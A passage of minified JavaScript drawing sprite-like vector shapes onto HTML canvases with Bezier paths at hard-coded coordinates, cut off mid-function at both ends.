      ye(n, t[4]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 79.5, e * 61.421875);
      n.bezierCurveTo(e * 88.5, e * 31.421875, e * 81.5, e * 16.421875, e * 75.5, e * 7.421875);
      n.bezierCurveTo(e * 77.5, e * 28.421875, e * 77.5, e * 37.421875, e * 68.5, e * 42.421875);
      n.bezierCurveTo(e * 79.5, e * 57.421875, e * 79.5, e * 58.421875, e * 80.5, e * 61.421875);
      n.closePath();
      ye(n, t[3], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72.5, e * 72.421875);
      n.bezierCurveTo(e * 76.5, e * 79.421875, e * 79.5, e * 80.421875, e * 83.5, e * 73.421875);
      n.bezierCurveTo(e * 80.5, e * 96.921875, e * 79.5, e * 114.421875, e * 77.5, e * 120.421875);
      n.closePath();
      ye(n, t[3], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87.5, e * 154.421875);
      n.bezierCurveTo(e * 93.5, e * 163.921875, e * 93.5, e * 163.921875, e * 99.5, e * 173.421875);
      n.bezierCurveTo(e * 95, e * 177.421875, e * 95, e * 177.421875, e * 90.5, e * 181.421875);
      n.bezierCurveTo(e * 89, e * 167.921875, e * 89, e * 167.921875, e * 87.5, e * 154.421875);
      n.closePath();
      ye(n, t[6], t[7], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 81.5, e * 164.421875);
      n.bezierCurveTo(e * 84, e * 172.921875, e * 84, e * 172.921875, e * 86.5, e * 181.421875);
      n.bezierCurveTo(e * 82.5, e * 182.421875, e * 82.5, e * 182.421875, e * 78.5, e * 183.421875);
      n.closePath();
      ye(n, t[6], t[7], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72.5, e * 164.421875);
      n.bezierCurveTo(e * 73.5, e * 173.921875, e * 73.5, e * 173.921875, e * 74.5, e * 183.421875);
      n.bezierCurveTo(e * 70.5, e * 182.921875, e * 70.5, e * 182.921875, e * 66.5, e * 182.421875);
      n.closePath();
      ye(n, t[6], t[7], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 65.5, e * 156.421875);
      n.bezierCurveTo(e * 65, e * 168.421875, e * 65, e * 168.421875, e * 64.5, e * 180.421875);
      n.bezierCurveTo(e * 58.5, e * 177.421875, e * 58.5, e * 177.421875, e * 52.5, e * 174.421875);
      n.closePath();
      ye(n, t[6], t[7], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42.5, e * 163.421875);
      n.bezierCurveTo(e * 62.5, e * 185.421875, e * 86.5, e * 186.421875, e * 111.5, e * 165.421875);
      n.bezierCurveTo(e * 107.5, e * 176.421875, e * 95.5, e * 187.421875, e * 75.5, e * 188.421875);
      n.bezierCurveTo(e * 53.5, e * 188.421875, e * 43.5, e * 171.421875, e * 42.5, e * 164.421875);
      n.closePath();
      ye(n, t[3], t[2], e * 4);
      return r;
    }
    function Qr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 170;
      n.translate(0, e * -170);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 159.5, e * 322.0625);
      n.bezierCurveTo(e * 240.5, e * 293.0625, e * 240.5, e * 293.0625, e * 321.5, e * 264.0625);
      n.bezierCurveTo(e * 276.5, e * 230.0625, e * 276.5, e * 230.0625, e * 231.5, e * 196.0625);
      n.bezierCurveTo(e * 158.5, e * 221.5625, e * 158.5, e * 221.5625, e * 85.5, e * 247.0625);
      n.closePath();
      ye(n, t[0], t[1], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 212.5, e * 270.0625);
      n.bezierCurveTo(e * 235, e * 261.5625, e * 235, e * 261.5625, e * 257.5, e * 253.0625);
      n.closePath();
      ye(n, undefined, t[0], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 193.5, e * 226.0625);
      n.bezierCurveTo(e * 204.5, e * 242.0625, e * 242.5, e * 237.0625, e * 251.5, e * 225.0625);
      n.bezierCurveTo(e * 246.5, e * 195.0625, e * 205.5, e * 190.0625, e * 193.5, e * 227.0625);
      n.closePath();
      ye(n, t[2], t[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 164.5, e * 245.0625);
      n.bezierCurveTo(e * 182.5, e * 264.0625, e * 252.5, e * 258.0625, e * 276.5, e * 244.0625);
      n.bezierCurveTo(e * 265.5, e * 226.0625, e * 244.5, e * 231.0625, e * 229.5, e * 230.0625);
      n.bezierCurveTo(e * 205.5, e * 227.0625, e * 175.5, e * 202.0625, e * 162.5, e * 244.0625);
      n.closePath();
      ye(n, t[2], t[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115.5, e * 260.0625);
      n.bezierCurveTo(e * 134.5, e * 279.0625, e * 170.5, e * 275.0625, e * 191.5, e * 257.0625);
      n.bezierCurveTo(e * 174.5, e * 208.0625, e * 142.5, e * 197.0625, e * 116.5, e * 259.0625);
      n.closePath();
      ye(n, t[2], t[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 152.5, e * 278.0625);
      n.bezierCurveTo(e * 165.5, e * 294.0625, e * 200.5, e * 287.0625, e * 216.5, e * 278.0625);
      n.bezierCurveTo(e * 206.5, e * 247.0625, e * 173.5, e * 233.0625, e * 153.5, e * 276.0625);
      n.closePath();
      ye(n, t[2], t[3], e * 12);
      return r;
    }
    function $r(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 272;
      r.height = e * 264;
      n.translate(0, e * 20);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56.999969482421875, e * 84.517333984375);
      n.bezierCurveTo(e * 61.999969482421875, e * 58.517333984375, e * 79.99996948242188, e * 50.517333984375, e * 102.99996948242188, e * 50.517333984375);
      n.bezierCurveTo(e * 119.99996948242188, e * 26.517333984375, e * 137.99996948242188, e * 32.517333984375, e * 156.99996948242188, e * 44.517333984375);
      n.bezierCurveTo(e * 187.99996948242188, e * 42.517333984375, e * 195.99996948242188, e * 50.517333984375, e * 202.99996948242188, e * 77.517333984375);
      n.bezierCurveTo(e * 229.99996948242188, e * 80.517333984375, e * 231.99996948242188, e * 96.517333984375, e * 229.99996948242188, e * 118.517333984375);
      n.bezierCurveTo(e * 241.99996948242188, e * 147.517333984375, e * 236.99996948242188, e * 148.517333984375, e * 220.99996948242188, e * 165.517333984375);
      n.bezierCurveTo(e * 222.99996948242188, e * 192.517333984375, e * 209.99996948242188, e * 212.517333984375, e * 177.99996948242188, e * 213.517333984375);
      n.bezierCurveTo(e * 159.99996948242188, e * 234.517333984375, e * 141.99996948242188, e * 234.517333984375, e * 116.99996948242188, e * 222.517333984375);
      n.bezierCurveTo(e * 72.99996948242188, e * 226.517333984375, e * 66.99996948242188, e * 207.517333984375, e * 65.99996948242188, e * 190.517333984375);
      n.bezierCurveTo(e * 35.999969482421875, e * 180.517333984375, e * 30.999969482421875, e * 162.517333984375, e * 39.999969482421875, e * 135.517333984375);
      n.bezierCurveTo(e * 23.999969482421875, e * 110.517333984375, e * 43.999969482421875, e * 90.517333984375, e * 55.999969482421875, e * 85.517333984375);
      n.closePath();
      ye(n, t[0]);
      n.translate(0, e * -20);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56.999969482421875, e * 84.517333984375);
      n.bezierCurveTo(e * 61.999969482421875, e * 58.517333984375, e * 79.99996948242188, e * 50.517333984375, e * 102.99996948242188, e * 50.517333984375);
      n.bezierCurveTo(e * 119.99996948242188, e * 26.517333984375, e * 137.99996948242188, e * 32.517333984375, e * 156.99996948242188, e * 44.517333984375);
      n.bezierCurveTo(e * 187.99996948242188, e * 42.517333984375, e * 195.99996948242188, e * 50.517333984375, e * 202.99996948242188, e * 77.517333984375);
      n.bezierCurveTo(e * 229.99996948242188, e * 80.517333984375, e * 231.99996948242188, e * 96.517333984375, e * 229.99996948242188, e * 118.517333984375);
      n.bezierCurveTo(e * 241.99996948242188, e * 147.517333984375, e * 236.99996948242188, e * 148.517333984375, e * 220.99996948242188, e * 165.517333984375);
      n.bezierCurveTo(e * 222.99996948242188, e * 192.517333984375, e * 209.99996948242188, e * 212.517333984375, e * 177.99996948242188, e * 213.517333984375);
      n.bezierCurveTo(e * 159.99996948242188, e * 234.517333984375, e * 141.99996948242188, e * 234.517333984375, e * 116.99996948242188, e * 222.517333984375);
      n.bezierCurveTo(e * 72.99996948242188, e * 226.517333984375, e * 66.99996948242188, e * 207.517333984375, e * 65.99996948242188, e * 190.517333984375);
      n.bezierCurveTo(e * 35.999969482421875, e * 180.517333984375, e * 30.999969482421875, e * 162.517333984375, e * 39.999969482421875, e * 135.517333984375);
      n.bezierCurveTo(e * 23.999969482421875, e * 110.517333984375, e * 43.999969482421875, e * 90.517333984375, e * 55.999969482421875, e * 85.517333984375);
      n.closePath();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 123.99996948242188, e * 116.18402099609375);
      n.bezierCurveTo(e * 115.99996948242188, e * 99.18402099609375, e * 109.99996948242188, e * 74.18402099609375, e * 109.99996948242188, e * 63.18402099609375);
      n.bezierCurveTo(e * 115.99996948242188, e * 69.18402099609375, e * 125.99996948242188, e * 87.18402099609375, e * 137.99996948242188, e * 112.18402099609375);
      n.bezierCurveTo(e * 142.99996948242188, e * 84.18402099609375, e * 143.99996948242188, e * 76.18402099609375, e * 153.99996948242188, e * 62.18402099609375);
      n.bezierCurveTo(e * 155.99996948242188, e * 79.18402099609375, e * 149.99996948242188, e * 110.18402099609375, e * 151.99996948242188, e * 117.18402099609375);
      n.bezierCurveTo(e * 162.99996948242188, e * 104.18402099609375, e * 180.99996948242188, e * 91.18402099609375, e * 191.99996948242188, e * 91.18402099609375);
      n.bezierCurveTo(e * 185.99996948242188, e * 102.18402099609375, e * 180.99996948242188, e * 106.18402099609375, e * 160.99996948242188, e * 124.18402099609375);
      n.bezierCurveTo(e * 190.99996948242188, e * 121.18402099609375, e * 199.99996948242188, e * 120.18402099609375, e * 207.99996948242188, e * 123.18402099609375);
      n.bezierCurveTo(e * 199.99996948242188, e * 129.18402099609375, e * 181.99996948242188, e * 132.18402099609375, e * 160.99996948242188, e * 135.18402099609375);
      n.bezierCurveTo(e * 179.99996948242188, e * 142.18402099609375, e * 193.99996948242188, e * 151.18402099609375, e * 196.99996948242188, e * 156.18402099609375);
      n.bezierCurveTo(e * 185.99996948242188, e * 156.18402099609375, e * 163.99996948242188, e * 149.18402099609375, e * 152.99996948242188, e * 147.18402099609375);
      n.bezierCurveTo(e * 157.99996948242188, e * 155.18402099609375, e * 165.99996948242188, e * 176.18402099609375, e * 169.99996948242188, e * 195.18402099609375);
      n.bezierCurveTo(e * 162.99996948242188, e * 190.18402099609375, e * 147.99996948242188, e * 167.18402099609375, e * 139.99996948242188, e * 153.18402099609375);
      n.bezierCurveTo(e * 137.99996948242188, e * 167.18402099609375, e * 126.99996948242188, e * 194.18402099609375, e * 119.99996948242188, e * 204.18402099609375);
      n.bezierCurveTo(e * 117.99996948242188, e * 186.18402099609375, e * 123.99996948242188, e * 165.18402099609375, e * 126.99996948242188, e * 149.18402099609375);
      n.bezierCurveTo(e * 110.99996948242188, e * 163.18402099609375, e * 103.99996948242188, e * 170.18402099609375, e * 82.99996948242188, e * 177.18402099609375);
      n.bezierCurveTo(e * 90.99996948242188, e * 162.18402099609375, e * 99.99996948242188, e * 153.18402099609375, e * 117.99996948242188, e * 140.18402099609375);
      n.bezierCurveTo(e * 97.99996948242188, e * 140.18402099609375, e * 83.99996948242188, e * 139.18402099609375, e * 65.99996948242188, e * 132.18402099609375);
      n.bezierCurveTo(e * 77.99996948242188, e * 127.18402099609375, e * 95.99996948242188, e * 127.18402099609375, e * 115.99996948242188, e * 127.18402099609375);
      n.bezierCurveTo(e * 91.99996948242188, e * 113.18402099609375, e * 84.99996948242188, e * 107.18402099609375, e * 76.99996948242188, e * 96.18402099609375);
      n.bezierCurveTo(e * 94.99996948242188, e * 99.18402099609375, e * 109.99996948242188, e * 109.18402099609375, e * 123.99996948242188, e * 116.18402099609375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 131.99996948242188, e * 119.18402099609375);
      n.bezierCurveTo(e * 141.99996948242188, e * 119.18402099609375, e * 145.99996948242188, e * 116.18402099609375, e * 147.99996948242188, e * 109.18402099609375);
      n.bezierCurveTo(e * 151.99996948242188, e * 107.18402099609375, e * 159.99996948242188, e * 107.18402099609375, e * 156.99996948242188, e * 123.18402099609375);
      n.bezierCurveTo(e * 155.99996948242188, e * 140.18402099609375, e * 142.99996948242188, e * 149.18402099609375, e * 132.99996948242188, e * 147.18402099609375);
      n.bezierCurveTo(e * 119.99996948242188, e * 144.18402099609375, e * 113.99996948242188, e * 122.18402099609375, e * 131.99996948242188, e * 119.18402099609375);
      n.closePath();
      ye(n, t[4], t[5], e * 6);
      return r;
    }
    function en(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 247;
      r.height = e * 247;
      n.translate(0, e * 10);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 150, e * 62);
      n.bezierCurveTo(e * 151.5, e * 71.5, e * 149, e * 70, e * 153, e * 81);
      n.bezierCurveTo(e * 158, e * 73.5, e * 158, e * 73.5, e * 163, e * 66);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 164, e * 171);
      n.bezierCurveTo(e * 149, e * 159, e * 156.5, e * 165, e * 149, e * 159);
      n.bezierCurveTo(e * 149, e * 167, e * 149, e * 170, e * 152, e * 178);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 132, e * 95);
      n.bezierCurveTo(e * 154, e * 102, e * 154, e * 126, e * 137, e * 139);
      n.bezierCurveTo(e * 113, e * 152, e * 89, e * 136, e * 80, e * 121);
      n.bezierCurveTo(e * 57, e * 89, e * 69, e * 63, e * 79, e * 52);
      n.bezierCurveTo(e * 110, e * 20, e * 139, e * 21, e * 150, e * 25);
      n.bezierCurveTo(e * 197, e * 36, e * 221, e * 67, e * 226, e * 90);
      n.bezierCurveTo(e * 234, e * 134, e * 214, e * 177, e * 195, e * 197);
      n.bezierCurveTo(e * 144, e * 242, e * 79, e * 216, e * 58, e * 206);
      n.bezierCurveTo(e * 13, e * 174, e * 20, e * 134, e * 23, e * 107);
      n.bezierCurveTo(e * 26, e * 78, e * 33, e * 60, e * 38, e * 43);
      n.bezierCurveTo(e * 42, e * 32, e * 47, e * 32, e * 50, e * 36);
      n.bezierCurveTo(e * 54, e * 37, e * 50, e * 52, e * 44, e * 87);
      n.bezierCurveTo(e * 40, e * 115, e * 46, e * 142, e * 57, e * 158);
      n.bezierCurveTo(e * 76, e * 189, e * 129, e * 182, e * 152, e * 173);
      n.bezierCurveTo(e * 186, e * 156, e * 191, e * 106, e * 176, e * 85);
      n.bezierCurveTo(e * 159, e * 61, e * 132, e * 62, e * 122, e * 66);
      n.bezierCurveTo(e * 108, e * 74, e * 108, e * 89, e * 116, e * 90);
      n.bezierCurveTo(e * 123, e * 92, e * 130, e * 93, e * 131, e * 94);
      n.closePath();
      ye(n, t[0]);
      n.translate(0, e * -10);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 150, e * 62);
      n.bezierCurveTo(e * 151.5, e * 71.5, e * 149, e * 70, e * 153, e * 81);
      n.bezierCurveTo(e * 158, e * 73.5, e * 158, e * 73.5, e * 163, e * 66);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 164, e * 171);
      n.bezierCurveTo(e * 149, e * 159, e * 156.5, e * 165, e * 149, e * 159);
      n.bezierCurveTo(e * 149, e * 167, e * 149, e * 170, e * 152, e * 178);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 132, e * 95);
      n.bezierCurveTo(e * 154, e * 102, e * 154, e * 126, e * 137, e * 139);
      n.bezierCurveTo(e * 113, e * 152, e * 89, e * 136, e * 80, e * 121);
      n.bezierCurveTo(e * 57, e * 89, e * 69, e * 63, e * 79, e * 52);
      n.bezierCurveTo(e * 110, e * 20, e * 139, e * 21, e * 150, e * 25);
      n.bezierCurveTo(e * 197, e * 36, e * 221, e * 67, e * 226, e * 90);
      n.bezierCurveTo(e * 234, e * 134, e * 214, e * 177, e * 195, e * 197);
      n.bezierCurveTo(e * 144, e * 242, e * 79, e * 216, e * 58, e * 206);
      n.bezierCurveTo(e * 13, e * 174, e * 20, e * 134, e * 23, e * 107);
      n.bezierCurveTo(e * 26, e * 78, e * 33, e * 60, e * 38, e * 43);
      n.bezierCurveTo(e * 42, e * 32, e * 47, e * 32, e * 50, e * 36);
      n.bezierCurveTo(e * 54, e * 37, e * 50, e * 52, e * 44, e * 87);
      n.bezierCurveTo(e * 40, e * 115, e * 46, e * 142, e * 57, e * 158);
      n.bezierCurveTo(e * 76, e * 189, e * 129, e * 182, e * 152, e * 173);
      n.bezierCurveTo(e * 186, e * 156, e * 191, e * 106, e * 176, e * 85);
      n.bezierCurveTo(e * 159, e * 61, e * 132, e * 62, e * 122, e * 66);
      n.bezierCurveTo(e * 108, e * 74, e * 108, e * 89, e * 116, e * 90);
      n.bezierCurveTo(e * 123, e * 92, e * 130, e * 93, e * 131, e * 94);
      n.closePath();
      ye(n, t[1], t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 137, e * 137);
      n.bezierCurveTo(e * 145, e * 125, e * 138, e * 108, e * 123, e * 104);
      n.bezierCurveTo(e * 81, e * 101, e * 88, e * 77, e * 98, e * 65);
      n.bezierCurveTo(e * 117, e * 38, e * 138, e * 39, e * 165, e * 52);
      n.bezierCurveTo(e * 197, e * 72, e * 207, e * 111, e * 197, e * 140);
      n.bezierCurveTo(e * 182, e * 180, e * 161, e * 197, e * 112, e * 194);
      n.bezierCurveTo(e * 58, e * 194, e * 37, e * 170, e * 34, e * 142);
      n.bezierCurveTo(e * 29, e * 102, e * 40, e * 63, e * 51, e * 45);
      n.bezierCurveTo(e * 43, e * 78, e * 41, e * 103, e * 43, e * 122);
      n.bezierCurveTo(e * 51, e * 158, e * 63, e * 174, e * 95, e * 179);
      n.bezierCurveTo(e * 129, e * 186, e * 169, e * 172, e * 177, e * 144);
      n.bezierCurveTo(e * 197, e * 105, e * 172, e * 76, e * 160, e * 71);
      n.bezierCurveTo(e * 125, e * 52, e * 111, e * 73, e * 111, e * 81);
      n.bezierCurveTo(e * 106, e * 93, e * 140, e * 92, e * 147, e * 107);
      n.bezierCurveTo(e * 153, e * 128, e * 140, e * 135, e * 137, e * 139);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 132, e * 95);
      n.bezierCurveTo(e * 154, e * 102, e * 154, e * 126, e * 137, e * 139);
      n.bezierCurveTo(e * 113, e * 152, e * 89, e * 136, e * 80, e * 121);
      n.bezierCurveTo(e * 57, e * 89, e * 69, e * 63, e * 79, e * 52);
      n.bezierCurveTo(e * 110, e * 20, e * 139, e * 21, e * 150, e * 25);
      n.bezierCurveTo(e * 197, e * 36, e * 221, e * 67, e * 226, e * 90);
      n.bezierCurveTo(e * 234, e * 134, e * 214, e * 177, e * 195, e * 197);
      n.bezierCurveTo(e * 144, e * 242, e * 79, e * 216, e * 58, e * 206);
      n.bezierCurveTo(e * 13, e * 174, e * 20, e * 134, e * 23, e * 107);
      n.bezierCurveTo(e * 26, e * 78, e * 33, e * 60, e * 38, e * 43);
      n.bezierCurveTo(e * 42, e * 32, e * 47, e * 32, e * 50, e * 36);
      n.bezierCurveTo(e * 54, e * 37, e * 50, e * 52, e * 44, e * 87);
      n.bezierCurveTo(e * 40, e * 115, e * 46, e * 142, e * 57, e * 158);
      n.bezierCurveTo(e * 76, e * 189, e * 129, e * 182, e * 152, e * 173);
      n.bezierCurveTo(e * 186, e * 156, e * 191, e * 106, e * 176, e * 85);
      n.bezierCurveTo(e * 159, e * 61, e * 132, e * 62, e * 122, e * 66);
      n.bezierCurveTo(e * 108, e * 74, e * 108, e * 89, e * 116, e * 90);
      n.bezierCurveTo(e * 123, e * 92, e * 130, e * 93, e * 131, e * 94);
      n.closePath();
      ye(n, undefined, t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 82, e * 63);
      n.bezierCurveTo(e * 91, e * 64, e * 96, e * 62, e * 98, e * 53);
      n.bezierCurveTo(e * 91, e * 45, e * 85, e * 42, e * 78, e * 41);
      n.bezierCurveTo(e * 81, e * 51, e * 82, e * 57, e * 82, e * 63);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 148, e * 40);
      n.bezierCurveTo(e * 140, e * 52, e * 131, e * 51, e * 123, e * 43);
      n.bezierCurveTo(e * 123, e * 25, e * 129, e * 17, e * 134, e * 12);
      n.bezierCurveTo(e * 138, e * 35, e * 142, e * 31, e * 148, e * 40);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 189, e * 43);
      n.bezierCurveTo(e * 191, e * 54, e * 196, e * 58, e * 205, e * 59);
      n.bezierCurveTo(e * 211, e * 42, e * 214, e * 37, e * 216, e * 31);
      n.bezierCurveTo(e * 202, e * 34, e * 195, e * 39, e * 190, e * 43);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 216, e * 98);
      n.bezierCurveTo(e * 219, e * 105, e * 225, e * 107, e * 230, e * 109);
      n.bezierCurveTo(e * 227, e * 113, e * 221, e * 115, e * 215, e * 115);
      n.bezierCurveTo(e * 208, e * 109, e * 211, e * 101, e * 216, e * 98);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 180, e * 85);
      n.bezierCurveTo(e * 193, e * 86, e * 196, e * 98, e * 191, e * 108);
      n.bezierCurveTo(e * 179, e * 112, e * 167, e * 113, e * 155, e * 111);
      n.bezierCurveTo(e * 169, e * 100, e * 176, e * 96, e * 180, e * 85);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 96, e * 114);
      n.bezierCurveTo(e * 102, e * 109, e * 112, e * 110, e * 114, e * 118);
      n.bezierCurveTo(e * 111, e * 134, e * 102, e * 143, e * 95, e * 147);
      n.bezierCurveTo(e * 98, e * 123, e * 97, e * 119, e * 96, e * 115);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 79, e * 92);
      n.bezierCurveTo(e * 86, e * 95, e * 89, e * 102, e * 83, e * 111);
      n.bezierCurveTo(e * 70, e * 110, e * 61, e * 107, e * 54, e * 100);
      n.bezierCurveTo(e * 70, e * 97, e * 70, e * 95, e * 78, e * 92);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 39, e * 130);
      n.bezierCurveTo(e * 37, e * 141, e * 41, e * 143, e * 48, e * 144);
      n.bezierCurveTo(e * 54, e * 134, e * 55, e * 131, e * 56, e * 123);
      n.bezierCurveTo(e * 47, e * 129, e * 43, e * 129, e * 39, e * 129);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 113, e * 189);
      n.bezierCurveTo(e * 119, e * 201, e * 127, e * 198, e * 134, e * 192);
      n.bezierCurveTo(e * 128, e * 175, e * 128, e * 173, e * 128, e * 165);
      n.bezierCurveTo(e * 117, e * 176, e * 116, e * 182, e * 113, e * 187);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 74, e * 154);
      n.bezierCurveTo(e * 76, e * 163, e * 76, e * 170, e * 75, e * 177);
      n.bezierCurveTo(e * 68, e * 179, e * 66, e * 176, e * 63, e * 171);
      n.bezierCurveTo(e * 69, e * 164, e * 72, e * 159, e * 74, e * 154);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 206, e * 152);
      n.bezierCurveTo(e * 198, e * 158, e * 198, e * 166, e * 201, e * 171);
      n.bezierCurveTo(e * 209, e * 170, e * 221, e * 170, e * 226, e * 172);
      n.bezierCurveTo(e * 219, e * 159, e * 210, e * 155, e * 207, e * 153);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 181, e * 184);
      n.bezierCurveTo(e * 170, e * 184, e * 167, e * 187, e * 163, e * 195);
      n.bezierCurveTo(e * 171, e * 207, e * 183, e * 214, e * 191, e * 217);
      n.bezierCurveTo(e * 183, e * 204, e * 184, e * 196, e * 181, e * 184);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 66, e * 199);
      n.bezierCurveTo(e * 73, e * 197, e * 78, e * 199, e * 79, e * 206);
      n.bezierCurveTo(e * 71, e * 216, e * 67, e * 221, e * 57, e * 223);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 182, e * 143);
      n.bezierCurveTo(e * 183, e * 146, e * 183, e * 149, e * 179, e * 152);
      n.bezierCurveTo(e * 174, e * 146, e * 174, e * 146, e * 169, e * 140);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 32, e * 159);
      n.bezierCurveTo(e * 45, e * 160, e * 48, e * 164, e * 45, e * 175);
      n.bezierCurveTo(e * 28, e * 183, e * 25, e * 184, e * 19, e * 184);
      n.bezierCurveTo(e * 30, e * 170, e * 29, e * 164, e * 31, e * 160);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 110, e * 214);
      n.bezierCurveTo(e * 106, e * 212, e * 104, e * 213, e * 102, e * 218);
      n.bezierCurveTo(e * 104, e * 220, e * 107, e * 222, e * 110, e * 224);
      n.bezierCurveTo(e * 110.5, e * 219, e * 110.5, e * 219, e * 111, e * 214);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 40, e * 52);
      n.bezierCurveTo(e * 41, e * 57, e * 40, e * 61, e * 34, e * 60);
      n.bezierCurveTo(e * 31.5, e * 55, e * 31.5, e * 55, e * 29, e * 50);
      n.bezierCurveTo(e * 34, e * 50.5, e * 34, e * 50.5, e * 39, e * 51);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 31, e * 81);
      n.bezierCurveTo(e * 37, e * 84, e * 38, e * 90, e * 34, e * 99);
      n.bezierCurveTo(e * 23, e * 97, e * 19, e * 96, e * 16, e * 93);
      n.bezierCurveTo(e * 24, e * 88, e * 28, e * 85, e * 30, e * 81);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      return r;
    }
    function tn(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 465;
      r.height = e * 310;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 126, e * 192);
      n.bezierCurveTo(e * 198, e * 202, e * 245, e * 203, e * 335, e * 194);
      n.bezierCurveTo(e * 336, e * 232, e * 326, e * 235, e * 232, e * 237);
      n.bezierCurveTo(e * 161, e * 235, e * 122, e * 235, e * 126, e * 193);
      n.closePath();
      ye(n, t[0], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 146, e * 239);
      n.bezierCurveTo(e * 174, e * 74, e * 287, e * 88, e * 320, e * 240);
      n.bezierCurveTo(e * 329, e * 231, e * 340, e * 219, e * 332, e * 115);
      n.bezierCurveTo(e * 330, e * 40, e * 144, e * 30, e * 129, e * 116);
      n.bezierCurveTo(e * 124, e * 217, e * 124, e * 228, e * 143, e * 237);
      n.closePath();
      ye(n, t[0], t[1], e * 4);
      n.beginPath();
